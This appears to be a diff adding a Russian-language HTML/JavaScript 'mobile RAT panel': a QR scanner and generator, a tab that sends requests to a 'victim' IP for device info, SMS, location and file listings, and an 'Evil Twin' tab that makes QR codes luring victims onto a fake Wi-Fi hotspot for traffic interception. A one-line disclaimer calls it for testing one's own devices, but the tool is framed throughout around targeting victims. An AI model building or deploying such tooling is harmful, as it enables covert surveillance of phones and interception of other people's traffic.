@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>H4CK_CONTROL_PANEL // MOBILE RAT PANEL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #000000;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            color: #00ff00;
+            padding: 16px;
+            padding-bottom: 80px;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .header {
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        .header h1 {
+            font-size: 20px;
+        }
+        .status {
+            font-size: 10px;
+            color: #8f8;
+        }
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            background: #0a1a0a;
+            border: 1px solid #00aa00;
+            padding: 10px 16px;
+            border-radius: 30px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 12px;
+            cursor: pointer;
+            color: #0f0;
+        }
+        .tab-btn.active {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 10px #0f0;
+        }
+        .panel {
+            display: none;
+            background: #0a0f0a;
+            border: 1px solid #1a4a1a;
+            border-radius: 20px;
+            padding: 18px;
+            margin-bottom: 20px;
+        }
+        .panel.active {
+            display: block;
+        }
+        input, select, textarea {
+            width: 100%;
+            background: #050a05;
+            border: 1px solid #2a6b2a;
+            color: #0f0;
+            padding: 12px;
+            font-family: monospace;
+            border-radius: 12px;
+            margin: 8px 0;
+        }
+        button {
+            background: #0a1a0a;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 12px;
+            font-weight: bold;
+            border-radius: 30px;
+            width: 100%;
+            cursor: pointer;
+            font-family: monospace;
+            margin: 8px 0;
+        }
+        button:active {
+            background: #0f0;
+            color: #000;
+        }
+        .output {
+            background: #030803;
+            padding: 12px;
+            border-left: 3px solid #0f0;
+            font-size: 11px;
+            margin-top: 12px;
+            border-radius: 8px;
+            word-break: break-all;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .qr-box {
+            text-align: center;
+            background: #030803;
+            padding: 16px;
+            border-radius: 16px;
+            margin-top: 12px;
+        }
+        .qr-box img {
+            background: white;
+            padding: 10px;
+            border-radius: 16px;
+            width: 200px;
+        }
+        .log {
+            background: #030803;
+            height: 150px;
+            overflow-y: auto;
+            font-size: 10px;
+            padding: 8px;
+            border-radius: 8px;
+            margin-top: 8px;
+        }
+        .log-entry {
+            border-bottom: 1px solid #1a3a1a;
+            padding: 4px 0;
+        }
+        hr {
+            border-color: #1a4a1a;
+            margin: 12px 0;
+        }
+        @media (max-width: 600px) {
+            body { padding: 12px; }
+            .tab-btn { padding: 8px 12px; font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔥 H4CK_CONTROL_PANEL</h1>
+        <span class="status">[ MOBILE RAT // QR // ATTACK ]</span>
+    </div>
+
+    <div class="tabs">
+        <div class="tab-btn" data-tab="tab1">📷 QR СКАН</div>
+        <div class="tab-btn" data-tab="tab2">🛠️ QR СОЗДАТЬ</div>
+        <div class="tab-btn" data-tab="tab3">💀 RAT ПАНЕЛЬ</div>
+        <div class="tab-btn" data-tab="tab4">📡 WIFI АТАКА</div>
+    </div>
+
+    <!-- ========== TAB 1: QR СКАНЕР ========== -->
+    <div id="tab1" class="panel">
+        <h3>📷 СКАНЕР QR С ПРОВЕРКОЙ</h3>
+        <button id="scanQrBtn">🔍 ОТКРЫТЬ КАМЕРУ</button>
+        <div class="output" id="scanResult">Нажми кнопку и наведись на QR</div>
+    </div>
+
+    <!-- ========== TAB 2: ГЕНЕРАТОР QR ========== -->
+    <div id="tab2" class="panel">
+        <h3>🛠️ СОЗДАТЬ QR</h3>
+        <select id="qrType">
+            <option value="url">🔗 ССЫЛКА</option>
+            <option value="tel">📞 ТЕЛЕФОН (tel:)</option>
+            <option value="wifi">📡 WIFI СЕТЬ</option>
+            <option value="text">📝 ТЕКСТ</option>
+        </select>
+        <div id="qrFormArea"></div>
+        <button id="genQrBtn">⚡ СОЗДАТЬ QR</button>
+        <div id="qrResultArea" class="qr-box" style="display:none;">
+            <img id="qrImage" src="">
+            <button id="downloadQrBtn">💾 СОХРАНИТЬ</button>
+            <div class="status" id="qrPayload"></div>
+        </div>
+    </div>
+
+    <!-- ========== TAB 3: RAT ПАНЕЛЬ (ОТПРАВКА КОМАНД) ========== -->
+    <div id="tab3" class="panel">
+        <h3>💀 RAT ПАНЕЛЬ</h3>
+        <div class="status">Цель: Redmi или другое устройство в твоей сети</div>
+        <input type="text" id="targetIp" placeholder="IP жертвы (например, 192.168.1.100)">
+        <input type="number" id="targetPort" placeholder="Порт (80, 8080, 5555)" value="80">
+        <select id="ratCommand">
+            <option value="info">📱 Получить информацию об устройстве</option>
+            <option value="sms">📨 Список СМС (если есть доступ)</option>
+            <option value="location">📍 Геолокация</option>
+            <option value="files">📁 Список файлов в /sdcard</option>
+            <option value="custom">🔧 СВОЯ КОМАНДА</option>
+        </select>
+        <input type="text" id="customCommand" placeholder="Свой путь (например, /proc/cpuinfo)" style="display:none;">
+        <button id="sendRatCommand">🚀 ОТПРАВИТЬ КОМАНДУ</button>
+        <div class="log" id="ratLog">
+            <div class="log-entry">💀 RAT панель готова. Введи IP жертвы.</div>
+        </div>
+    </div>
+
+    <!-- ========== TAB 4: WIFI АТАКА (ФЕЙКОВАЯ ТОЧКА + QR) ========== -->
+    <div id="tab4" class="panel">
+        <h3>📡 WIFI АТАКА (Evil Twin)</h3>
+        <div class="status">Создай QR для фейковой точки, жертва подключится → ты перехватываешь трафик</div>
+        <input type="text" id="fakeSsid" placeholder="Имя фейковой сети (SSID)" value="Free_Public_WiFi">
+        <input type="text" id="fakePass" placeholder="Пароль" value="12345678">
+        <button id="genEvilQrBtn">⚡ СОЗДАТЬ QR ДЛЯ ФЕЙКОВОЙ ТОЧКИ</button>
+        <div id="evilQrArea" class="qr-box" style="display:none;">
+            <img id="evilQrImg" src="">
+            <button id="downloadEvilQrBtn">💾 СОХРАНИТЬ QR</button>
+            <div class="status" id="evilPayload"></div>
+        </div>
+        <hr>
+        <h3>📡 СКАНИРОВАНИЕ СЕТИ (найти жертву)</h3>
+        <button id="scanNetworkBtn">🔍 НАЙТИ УСТРОЙСТВА В СЕТИ</button>
+        <div class="output" id="networkScanResult"></div>
+    </div>
+
+    <div class="status" style="text-align:center; margin-top:16px;">⚠️ Только для тестирования своих устройств</div>
+</div>
+
+<script>
+    // ========== ОБЩИЕ ПЕРЕМЕННЫЕ ==========
+    let jsQRloaded = false;
+
+    function loadJsQR() {
+        return new Promise((resolve) => {
+            if (window.jsQR) { resolve(); return; }
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js';
+            script.onload = () => resolve();
+            document.head.appendChild(script);
+        });
+    }
+
+    function logToDiv(divId, msg, isError = false) {
+        const logDiv = document.getElementById(divId);
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        entry.style.color = isError ? '#ff8888' : '#8f8';
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logDiv.appendChild(entry);
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    // ========== ВКЛАДКИ ==========
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            const tabId = btn.getAttribute('data-tab');
+            document.querySelectorAll('.panel').forEach(panel => panel.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+        });
+    });
+
+    // ========== TAB 1: QR СКАНЕР ==========
+    document.getElementById('scanQrBtn').onclick = async () => {
+        await loadJsQR();
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.capture = 'environment';
+        input.onchange = async (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+            const img = new Image();
+            const objUrl = URL.createObjectURL(file);
+            img.src = objUrl;
+            img.onload = () => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                const code = window.jsQR(imgData.data, canvas.width, canvas.height);
+                URL.revokeObjectURL(objUrl);
+                if (code && code.data) {
+                    const url = code.data;
+                    let safety = checkUrlSafety(url);
+                    document.getElementById('scanResult').innerHTML = `<strong>📎 Ссылка:</strong><br>${escapeHtml(url)}<br><br><strong>${safety.message}</strong>${safety.safe ? ' ✅' : ' ⚠️'}`;
+                } else {
+                    document.getElementById('scanResult').innerHTML = '❌ QR не распознан';
+                }
+            };
+        };
+        input.click();
+    };
+
+    function checkUrlSafety(url) {
+        const lower = url.toLowerCase();
+        if (lower.includes('login') || lower.includes('verify') || lower.includes('secure')) {
+            return { safe: false, message: '⚠️ ПОДОЗРИТЕЛЬНО: фишинговые ключевые слова' };
+        }
+        if (lower.startsWith('http://')) {
+            return { safe: false, message: '⚠️ НЕБЕЗОПАСНО: HTTP протокол' };
+        }
+        if (lower.includes('bit.ly') || lower.includes('goo.gl') || lower.includes('tinyurl')) {
+            return { safe: false, message: '⚠️ КОРОТКАЯ ССЫЛКА: реальный адрес скрыт' };
+        }
+        return { safe: true, message: '✅ БЕЗОПАСНО: явных угроз не обнаружено' };
+    }
+
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // ========== TAB 2: ГЕНЕРАТОР QR ==========
+    function updateQrForm() {
+        const type = document.getElementById('qrType').value;
+        const area = document.getElementById('qrFormArea');
+        if (type === 'url') {
+            area.innerHTML = '<input type="text" id="qrUrl" placeholder="https://example.com" value="https://google.com">';
+        } else if (type === 'tel') {
+            area.innerHTML = '<input type="tel" id="qrTel" placeholder="+79991234567" value="+79991234567">';
+        } else if (type === 'wifi') {
+            area.innerHTML = `<input type="text" id="qrWifiSsid" placeholder="SSID" value="Free_WiFi">
+                             <input type="text" id="qrWifiPass" placeholder="Пароль" value="12345678">
+                             <select id="qrWifiEnc"><option value="WPA">WPA/WPA2</option><option value="nopass">Без пароля</option></select>`;
+        } else if (type === 'text') {
+            area.innerHTML = '<textarea id="qrText" rows="2" placeholder="Введи текст"></textarea>';
+        }
+    }
+    document.getElementById('qrType').addEventListener('change', updateQrForm);
+    updateQrForm();
+
+    function getQrPayload() {
+        const type = document.getElementById('qrType').value;
+        if (type === 'url') return document.getElementById('qrUrl')?.value || 'https://example.com';
+        if (type === 'tel') return 'tel:' + (document.getElementById('qrTel')?.value || '');
+        if (type === 'wifi') {
+            let ssid = document.getElementById('qrWifiSsid')?.value || 'WiFi';
+            let pass = document.getElementById('qrWifiPass')?.value || '';
+            let enc = document.getElementById('qrWifiEnc')?.value;
+            if (enc === 'nopass') return `WIFI:T:nopass;S:${ssid};;`;
+            return `WIFI:T:${enc};S:${ssid};P:${pass};;`;
+        }
+        if (type === 'text') return document.getElementById('qrText')?.value || 'text';
+        return '';
+    }
+
+    document.getElementById('genQrBtn').onclick = () => {
+        const payload = getQrPayload();
+        if (!payload) return;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(payload)}`;
+        document.getElementById('qrImage').src = qrUrl;
+        document.getElementById('qrPayload').innerHTML = `📦 ${payload.length > 80 ? payload.substring(0,80)+'…' : payload}`;
+        document.getElementById('qrResultArea').style.display = 'block';
+        document.getElementById('downloadQrBtn').onclick = () => {
+            const link = document.createElement('a');
+            link.download = 'qr.png';
+            link.href = qrUrl;
+            link.click();
+        };
+    };
+
+    // ========== TAB 3: RAT ПАНЕЛЬ ==========
+    document.getElementById('ratCommand').addEventListener('change', (e) => {
+        const custom = document.getElementById('customCommand');
+        if (e.target.value === 'custom') {
+            custom.style.display = 'block';
+        } else {
+            custom.style.display = 'none';
+        }
+    });
+
+    async function sendRatRequest() {
+        let ip = document.getElementById('targetIp').value.trim();
+        let port = document.getElementById('targetPort').value;
+        let cmd = document.getElementById('ratCommand').value;
+        let path = '';
+        if (cmd === 'info') path = '/info';
+        else if (cmd === 'sms') path = '/sms';
+        else if (cmd === 'location') path = '/location';
+        else if (cmd === 'files') path = '/files';
+        else if (cmd === 'custom') path = document.getElementById('customCommand').value.trim();
+        if (!ip) { logToDiv('ratLog', '❌ Введи IP жертвы', true); return; }
+        if (!path) path = '/';
+        const url = `http://${ip}:${port}${path}`;
+        logToDiv('ratLog', `🚀 Запрос на ${url}`);
+        try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 5000);
+            const res = await fetch(url, { method: 'GET', signal: controller.signal });
+            clearTimeout(timeout);
+            const text = await res.text();
+            logToDiv('ratLog', `📥 Ответ: ${text.substring(0, 200)}`);
+        } catch(e) {
+            logToDiv('ratLog', `❌ Ошибка: ${e.message}`, true);
+        }
+    }
+    document.getElementById('sendRatCommand').onclick = sendRatRequest;
+
+    // ========== TAB 4: WIFI АТАКА ==========
+    document.getElementById('genEvilQrBtn').onclick = () => {
+        const ssid = document.getElementById('fakeSsid').value.trim();
+        const pass = document.getElementById('fakePass').value.trim();
+        if (!ssid) return;
+        let wifiString = `WIFI:T:WPA;S:${ssid};P:${pass};;`;
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(wifiString)}`;
+        document.getElementById('evilQrImg').src = qrUrl;
+        document.getElementById('evilPayload').innerHTML = `📡 ${ssid} | ${pass}`;
+        document.getElementById('evilQrArea').style.display = 'block';
+        document.getElementById('downloadEvilQrBtn').onclick = () => {
+            const link = document.createElement('a');
+            link.download = 'evil_wifi.png';
+            link.href = qrUrl;
+            link.click();
+        };
+    };
+
+    // Сканирование сети через API
+    document.getElementById('scanNetworkBtn').onclick = async () => {
+        const out = document.getElementById('networkScanResult');
+        out.innerHTML = '🔍 Сканирование... (твой IP и шлюз)';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const publicIp = ipData.ip;
+            out.innerHTML = `🌍 Твой публичный IP: ${publicIp}<br>📡 Локальные устройства: чтобы найти IP жертвы в твоей WiFi сети, используй приложение Fing из App Store или зайди в настройки роутера (обычно 192.168.0.1 или 192.168.1.1).<br>💡 На Redmi: Настройки → Об устройстве → IP-адрес`;
+        } catch(e) {
+            out.innerHTML = '❌ Не удалось определить IP';
+        }
+    };
+
+    // активация первой вкладки
+    document.querySelector('.tab-btn').click();
+</script>
+</body>
+</html>
